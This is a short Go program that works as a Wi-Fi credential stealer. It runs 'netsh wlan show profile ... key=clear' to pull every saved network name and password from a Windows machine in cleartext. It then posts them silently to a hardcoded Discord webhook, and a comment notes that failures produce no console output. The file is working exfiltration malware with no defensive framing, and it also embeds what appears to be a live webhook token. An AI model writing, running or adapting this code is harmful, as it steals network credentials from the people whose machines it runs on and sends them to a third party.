package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os/exec"
	"strings"
)

// RunCommand executes a command and returns the output
func RunCommand(command string, args ...string) (string, error) {
	cmd := exec.Command(command, args...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", err
	}
	return string(output), nil
}

// SendToDiscord sends a message to the specified Discord webhook
func SendToDiscord(webhookURL, message string) error {
	// Prepare the message payload
	payload := map[string]interface{}{
		"content": message,
	}

	// Marshal the payload to JSON
	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("error marshaling JSON payload: %v", err)
	}

	// Send the HTTP POST request to Discord webhook
	_, err = http.Post(webhookURL, "application/json", bytes.NewBuffer(jsonPayload))
	if err != nil {
		return fmt.Errorf("error sending message to Discord: %v", err)
	}

	return nil
}

// ExtractWifiPasswords extracts Wi-Fi profiles and their passwords and sends to Discord
func ExtractWifiPasswords(webhookURL string) {
	// Get the list of Wi-Fi profiles
	output, err := RunCommand("netsh", "wlan", "show", "profiles")
	if err != nil {
		return
	}

	// Parse the output to find Wi-Fi profiles
	profiles := strings.Split(output, "\n")
	var message string
	for _, profile := range profiles {
		if strings.Contains(profile, "All User Profile") {
			// Extract the profile name
			profileName := strings.TrimSpace(strings.Split(profile, ":")[1])

			// Get the Wi-Fi password for this profile
			passwordOutput, err := RunCommand("netsh", "wlan", "show", "profile", profileName, "key=clear")
			if err != nil {
				continue
			}

			// Look for the password in the output
			if strings.Contains(passwordOutput, "Key Content") {
				// Extract the password
				lines := strings.Split(passwordOutput, "\n")
				for _, line := range lines {
					if strings.Contains(line, "Key Content") {
						password := strings.TrimSpace(strings.Split(line, ":")[1])
						message += fmt.Sprintf("SSID: %s\nPassword: %s\n\n", profileName, password)
					}
				}
			} else {
				message += fmt.Sprintf("Profile: %s\nPassword: [Not Set]\n\n", profileName)
			}
		}
	}

	// If there are extracted Wi-Fi profiles, send the result to Discord
	if message != "" {
		err := SendToDiscord(webhookURL, message)
		if err != nil {
			// If sending to Discord fails, do nothing (no console output)
			return
		}
	}
}

func main() {
	// Replace with your Discord webhook URL
	webhookURL := "https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2"

	// Extract Wi-Fi passwords and send them to Discord
	ExtractWifiPasswords(webhookURL)
}
